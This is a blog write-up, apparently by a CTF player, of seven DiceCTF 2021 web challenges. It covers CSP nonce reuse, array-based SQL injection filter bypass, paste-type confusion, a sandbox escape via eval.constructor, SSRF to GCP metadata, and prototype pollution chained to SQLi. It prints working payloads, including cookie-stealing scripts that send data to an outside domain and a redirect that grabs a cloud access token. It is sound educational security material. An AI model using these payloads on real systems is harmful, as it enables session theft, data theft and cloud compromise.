---
title: DiceCTF Web Writeups - Client Side Chaining And JS Attacks
summary: 
date: "2021-02-10T22:00:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: "Web challenges writeup from DiceCTF, we covered some client side attacks that can be chained to leverage the impact and some common JS attacks. "
  image: ""
---

Hello everybody , it has been a long time since I have posted a writeup :( I have been a little busy in the last period with school assignments, exams and some work (Covid has really messed up my life). After a little break I had fun participating in Dice CTF which had some great client side challenges, we will explore them in details in this article , we assume you have a background about basic client side attacks, so let's start our ride now. (Challenges are still up, you can try them **[HERE](https://ctf.dicega.ng/challs)** or follow along with me)
## Summary ##
1- Client Side chaining attacks

2- Babier CSP

3- Missing Flavortext

4- Web Utils

5- Build a Panel

6- Web IDE

7- Watermark as a Service

8- Build a Better Panel

## Client Side Chaining Attacks ##

Generally client side bugs alone have a low impact , but with the great research going on it's possible to chain multiple bugs together and get a higher impact, a simple reflected XSS can now lead to account takeover if it's chained with some other bugs. The last CTFs have been focusing on this techniques and DiceCTF was not an exception , it had great tasks that required chaining multiple bugs to get the flag.

## Babier CSP ##
![TASK](https://imgur.com/4p9Tvbc.png)

The website is simple and has an obvious reflected XSS but it was protected with a strict CSP (Content Security Policy). Firstly I didn't notice the source code that was provided with the task so I tried to find a way to bypass the CSP
```
default-src none; script-src 'nonce-g+ojjmb9xLfE+3j9PsP/Ig==';
```
![TASK](https://imgur.com/sZpg1oc.png)

In fact, if we focus a little bit you can see that none is not situated between two quotation marks so it will be interpreted as the hostname "none" , I played a little bit with this but i reached a dead end :'( Fortunately when I saw the source code it was obvious that the nonce is only generated once so we can reuse it.

```javascript
const express = require('express');
const crypto = require("crypto");
const config = require("./config.js");
const app = express()
const port = process.env.port || 3000;

const SECRET = config.secret;
const NONCE = crypto.randomBytes(16).toString('base64');

const template = name => `
<html>

${name === '' ? '': `<h1>${name}</h1>`}
<a href='#' id=elem>View Fruit</a>

<script nonce=${NONCE}>
elem.onclick = () => {
  location = "/?name=" + encodeURIComponent(["apple", "orange", "pineapple", "pear"][Math.floor(4 * Math.random())]);
}
</script>

</html>
`;

app.get('/', (req, res) => {
  res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
  res.send(template(req.query.name || ""));
})

app.use('/' + SECRET, express.static(__dirname + "/secret"));

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
```

So Our last payload that we will send to the admin bot is:

```
https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%22LRGWAXOY98Es0zz0QOVmag==%22%3Edocument.location=%22https://fword.wtf/?a=%22%2Bdocument.cookie;%3C/script%3E
```

**PS:** I used window.location because of default-src attribute in CSP so we can only use fetch for example with the hostname none. 

## Missing Flavortext ##

The website is a simple login page and we have the source code
```js
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('static'));

// login route
app.post('/login', (req, res) => {
  if (!req.body.username || !req.body.password) {
    return res.redirect('/');
  }

  if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }

  // see if user is in database
  const query = `SELECT id FROM users WHERE
    username = '${req.body.username}' AND
    password = '${req.body.password}'
  `;

  let id;
  try { id = db.prepare(query).get()?.id } catch {
    return res.redirect('/');
  }

  // correct login
  if (id) return res.sendFile('flag.html', { root: __dirname });

  // incorrect login
  return res.redirect('/');
});

app.listen(3000);
```

We can easily notice the sql injection in this piece of code 
```js
  const query = `SELECT id FROM users WHERE
    username = '${req.body.username}' AND
    password = '${req.body.password}'
  `;
```
But there is a simple filter that is blacklisting the quotation mark:
```js
  if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }
```

Let's focus on bypassing the filter , I encountered this type of check algorithms a lot in previous CTFs so after seeing `` app.use(bodyParser.urlencoded({ extended: true }));`` I knew that we will try to use arrays to trick the filter. When the extended attribute of bodyparser is set to True we can use any type in the request parameters (When it's set to false we can only use strings or arrays). "Includes" function can be used for arrays and strings so if we pass the password as an array we will be able to bypass the filter. (I covered this technique in more details in the following **[writeup](https://ahmed-belkahla.me/post/angstromctf20/)**) . Finally running the following command we will get our flag:
```
curl -d "username=admin&password[]='or 1=1 -- -" https://missing-flavortext.dicec.tf/login
```
![FLAG](https://imgur.com/vjRONbL.png)

## Web Utils ##

![TASK](https://imgur.com/U8ZpCk8.png)

We have a website that have link sortener and pastebin functionalities, our goal is to steal the admin cookies so the first thing I thinked about is finding an XSS.

![TASK](https://imgur.com/qsD2mmS.png)

After exploring the existing fields in the website there was no obvious XSS, while I was exploring the source code I had the idea to try shortening a url of the following form ```javascript:alert(1);``` but there was a regex expression filtering the url format. 
```js
module.exports = async (fastify) => {
  fastify.post('createLink', {
    handler: (req, rep) => {
      const uid = database.generateUid(8);
      const regex = new RegExp('^https?://');
      if (! regex.test(req.body.data))
        return rep
          .code(200)
          .header('Content-Type', 'application/json; charset=utf-8')
          .send({
            statusCode: 200,
            error: 'Invalid URL'
          });
```
But focusing more on the source code we can notice this piece of code in the CreatePaste endpoint :

```js
  fastify.post('createPaste', {
    handler: (req, rep) => {
      const uid = database.generateUid(8);
      database.addData({ type: 'paste', ...req.body, uid });
      rep
        .code(200)
        .header('Content-Type', 'application/json; charset=utf-8')
        .send({
          statusCode: 200,
          data: uid
        });
    },
```
The following line is pretty juicy 
```js
database.addData({ type: 'paste', ...req.body, uid });
```
Any parameter we will send in the request's body will be passed to the addData function so we can change the type of the added data to "link" and get rid of the regex expression in the CreateLink endpoint, so the payload will be :

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"type":"link","data":"javascript:fetch(\"https://<Domain>?a=\"+document.cookie);"}' https://web-utils.dicec.tf/api/createPaste
```

![TASK](https://imgur.com/SM1F62T.png)

After that we send the paste link ``https://web-utils.dicec.tf/view/HW9BHr0a`` to the admin bot  and we get the cookie in our controlled web server (You can use webhook.site for example).

## Build a Panel ##

![TASK](https://imgur.com/Fwqh7PY.png)

The website is simple , you can create a panel and add some widgets in it . After analysing the provided source code we can notice that the flag is in the database.

```js
db.run(query);
query = `CREATE TABLE IF NOT EXISTS flag (
    flag TEXT
)`;
db.run(query, [], (err) => {
    if(!err){
        let innerQuery = `INSERT INTO flag SELECT 'dice{fake_flag}'`;
        db.run(innerQuery);
    }else{
        console.error('Could not create flag table');
    }
});
```

The following piece code looks interesting , we can see the SQL injection vulnerability but unfortunately this endpoint is only accessible by the admin

```js
app.get('/admin/debug/add_widget', async (req, res) => {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(cookies['token'] && cookies['token'] == secret_token){
        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
        db.run(query, (err) => {
            if(err){
                console.log(err);
                res.send('something went wrong');
            }else{
                res.send('success!');
            }
        });
    }else{
        res.redirect('/');
    }
});

app.listen(31337, () => {
    console.log('express listening on 31337')
});
```

So what if we send the link having our SQL injection payload to the admin so it will be executed as the admin and we can bypass the following check 
```js
if(cookies['token'] && cookies['token'] == secret_token)
```

For the SQL injection part we will use the subqueries to create a widget in our panel with a title having the flag , our final payload that we will send to the admin bot is :
```
https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=<Your-Panel-ID>', (select flag from flag limit 1), '1');--&widgetname=a&widgetdata=a
```
And Bingo our beloved flag is there :D

![TASK](https://imgur.com/c51VGbR.png)

## Web IDE ##

The website is a simple IDE to run javascript code in a sandboxed environment, we have the source code as usual .

![TASK](https://imgur.com/z5jCnly.png)

After analysing the code we can notice that the flag is in the admin cookie so obviously our goal will be to steal it

```js
  case 'admin':
    if (password === adminPassword)
      return res.cookie('token', `dice{${process.env.FLAG}}`, {
        path: '/ide',
        sameSite: 'none',
        secure: true
      }).redirect('/ide/');
    break;
  }
  res.status(401).end();
```
The restrictions that are set up are the following:

```js
app.use('/', (req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  return next();
});
// sandbox the sandbox
app.use('/sandbox.html', (req, res, next) => {
  res.setHeader('Content-Security-Policy', 'frame-src \'none\'');
  // we have to allow this for obvious reasons
  res.removeHeader('X-Frame-Options');
  return next();
});
```
I tried to think about a possible scenario in order to achieve xss, the first thing was to try to bypass the sandbox so let's take a look at its code in sandbox.js:

```js
  const safeEval = (d) => (function (data) {
    with (new Proxy(window, {
      get: (t, p) => {
        if (p === 'console') return { log };
        if (p === 'eval') return window.eval;
        return undefined;
      }
    })) {
      eval(data);
    }
  }).call(Object.create(null), d);
  ```
  
  The page is listening for a postmessage , once received it execute safeEval function that is acting as a proxy, we can see that entering eval will return window.eval so what about using **eval's constructor** to execute our js code freely: ```eval.constructor("console.log(1);")()``` will print 1 in the console so our code is executed. We need now to get the cookie from /ide path since the admin cookie's path is set like the following
  ```
{
        path: '/ide',
        sameSite: 'none',
        secure: true
}
  ```
For this i used window.open in order to open https://web-ide.dicec.tf/ide/ and access the dom from the window reference , this is only possible because we are not violating the same origin policy and opening the window from the same origin .
Let's wrap the things up now, we will create a webpage that when the admin visits it, we will send a postmessage to the sandbox ( that's why you have to check the origin when you are using postmessages ) and open a window of https://web-ide.dicec.tf/ide/ and send the cookie to our controlled website. The final payload code :

```html
<html>
<head>
    <title>PoC</title>
</head>
<body>
<iframe id="vuln" src="https://web-ide.dicec.tf/sandbox.html"></iframe>
<script>
setTimeout(
()=>{document.getElementById("vuln").contentWindow.postMessage("eval.constructor(\"var w=window.open('https://web-ide.dicec.tf/ide/');setTimeout(()=>{window.location='https://<Your-Domain>?a='+btoa(w.document.cookie);},2000);\")();","*")}
,2000);
</script>
</body>
</html>

```
We only have to host this page on our server and send the link to the admin bot . This was an unintended solution , the intended one is abusing service workers and navigator.sendBeacon in order to steal the cookie , you can check more details **[HERE]( https://discord.com/channels/805956008665022475/808122408019165204/808143656946368512)** .

I enjoyed this task the most and it required me some time that's why i solved it after the end of the CTF but still learned a lot from it.

## Watermark as a Service ##

Unfortunately, I didn't have the chance to take a look at this task while the CTF was running but it was a fun easy task. We have a website that visits the link we enter and takes a screenshot of the website.  

![TASK](https://imgur.com/Qo6chyi.png)

Most of you are thinking now of SSRF attack but there are some strict filters restricting us from using usual payloads and DNS rebinding tricks.

```js
  let urlObj;
  try {
    urlObj = new URL(url);
  } catch {
    res.sendStatus(400);
    return;
  }

  const hostname = urlObj?.hostname;

  if (!hostname || ip.isPrivate(hostname)) {
    res.sendStatus(400);
    return;
  }

  if (BLOCKED_HOSTS.some((blockedHost) => hostname.includes(blockedHost))) {
    res.sendStatus(400);
    return;
  }

  const protocol = urlObj?.protocol;
  if (
    !protocol ||
    !ALLOWED_PROTOCOLS.some((allowedProtocol) =>
      protocol.includes(allowedProtocol)
    )
  ) {
    res.sendStatus(400);
    return;
  }

  let addresses
  try {
    addresses = await resolve4(hostname);
  } catch {
    res.sendStatus(400);
    return;
  }

  if (addresses.includes("169.254.169.254")) {
    res.sendStatus(400);
    return;
  }
```
Our goal is to access google cloud metadata in order to get the access token and explore their cloud infrastructure .
Analysing the source code, we can figure that the website is using puppeteer which is a headless chrome browser so we can host a normal static page that has a simple ```js window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";```

tbh I didn't try this solution, I have just developed a simple webapp that returns a 302 status code redirect to Google Cloud internal metadata, this is the source code:
```php
<?php
header('Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token', true, 301);
exit;
?>
```

I like tasks that don't need a lot of code xD You can also simply use an url shortener like cuttly or bit.ly. We have the following result after redirecting it to ``http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true```.
Notice that we are using the beta service of metadata endpoint because it doesn't require any additional headers to setup.

![TASK](https://imgur.com/jVhKZIM.png)

If you focus on the results there is a docker image in ```https://gcr.io/dicegang-waas/waas``` so let's grab the google cloud access token and try to run the docker image , we will redirect it to the following url now 

``http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token `` 

Bingo we have the access token now

![TASK](https://imgur.com/FcF5jWo.png)

I was really a little bit lazy to use an ocr tool and copy the access token from the screenshot x) All you have to do now is to run the following commands ([Ref](https://cloud.google.com/container-registry/docs/advanced-authentication?hl=fr#token)):
```sh 
docker login -u oauth2accesstoken -p "<Access-Token>" https://gcr.io/
```
Then

```sh
docker pull gcr.io/dicegang-waas/waas
```
And finally running the image will give you the flag

```sh
docker run -it gcr.io/dicegang-waas/waas
```
**Fun Fact:** We used a similar technique to break into a previous CTF infrastructure, if you are eager to know more you can read this **[tweet](https://twitter.com/FwordTeam/status/1340988591787401216)**

## Build a Better Panel ##

This task was the same as Build a Panel but the admin bot was restricted to visit only the websites matching this regex `` ^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$ `` so we can't send directly the url having the SQL injection payload, we need to find a client side bug and chain it in order to achieve our goal.
I started exploring the client side code and the following snippet seemed suspicious:
```js
const mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];

const safeDeepMerge = (target, source) => {
    for (const key in source) {
        if(!mergableTypes.includes(typeof source[key]) && !mergableTypes.includes(typeof target[key])){
            if(key !== '__proto__'){
                safeDeepMerge(target[key], source[key]);
            }
        }else{
            target[key] = source[key];
        }
    }
}

const displayWidgets = async () => {
    const userWidgets = await (await fetch('/panel/widgets', {method: 'post', credentials: 'same-origin'})).json();
    let toDisplayWidgets = {'welcome back to build a panel!': {'type': 'welcome'}};

    safeDeepMerge(toDisplayWidgets, userWidgets);
```

There is an obvious prototype pollution vulnerability but we need to bypass the filter of "\_\_proto\_\_" , fortunately we are talking about javascript here where everything is possible :D 

![TASK](https://imgur.com/y74Mw1v.png)

**a.\_\_proto\_\_** is similar to **a.constructor.prototype** (a is a JS object) , userWidgets is fetched from **/panel/widgets** and we can control the data passed to an object. Let's check the part responsible of returning the widgets in the backend

```js
app.post('/panel/widgets', (req, res) => {
    const cookies = req.cookies;

    if(cookies['panelId']){
        const panelId = cookies['panelId'];

        query = `SELECT widgetname, widgetdata FROM widgets WHERE panelid = ?`;
        db.all(query, [panelId], (err, rows) => {
            if(!err){
                let panelWidgets = {};
                for(let row of rows){
                    try{
                        panelWidgets[row['widgetname']] = JSON.parse(row['widgetdata']);
                    }catch{
                        
                    }
                }
                res.json(panelWidgets);
            }else{
                res.send('something went wrong');
            }
        });
    }
});
```

The following line is the most juicy:

```js
panelWidgets[row['widgetname']] = JSON.parse(row['widgetdata']);
```
This screenshot can resume what will happen:

![TASK](https://imgur.com/4jQJ5SI.png)

Now we have to figure out what to do with the prototype pollution and use it to achieve an XSS or somehow send a request to the endpoint vulnerable to SQL Injection (XSS is pretty hard because there is a strict CSP). After searching a little bit I found the following [github repo](https://github.com/BlackFan/client-side-prototype-pollution) holding several gadgets to use. The website is using embedly and I found the following gadget to achieve XSS ( **[Gadget](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md)** ) but as we said with the used CSP it's nearly impossible to execute JS code .
```
default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;
```
After the end of the CTF I discovered from the discord server of the CTF that there was another gadget permitting us to set any attribute of an iframe , so we can set the srcdoc attribute to redirect the admin to the endpoint vulnerable to SQL injection, our final payload that we will send to create a widget is :

```
{"widgetName":"constructor","widgetData":"{\"prototype\":{\"srcdoc\":\"<script src=\\\"https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=kahlaa%27%2C%20%28select%20flag%20from%20flag%20limit%201%29%2C%20%271%27%29%3B--&widgetname=1&widgetdata=1\\\" ></script>\"}}"}

```
Note that we can execute our payload because the script-src in CSP is set to 'self'.

Finally we have to send the url that opens our panel to the admin in order to execute our gadget `` https://build-a-better-panel.dicec.tf/create?panelId=kahlaa `` .
And Bingo we received our flag :D 

![TASK](https://imgur.com/AkvBN7X.png)

## Conclusion ##
Thank you for reading all the article and sorry if it was a little bit long \o/
DiceCTF was really fun and a good one to start with after some long break :D Unfortunately I couldn't fully participate but it was also fun to complete the tasks after its end. If you have any questions you can contact me on twitter,facebook or by mail , i'll be very glad to help.

























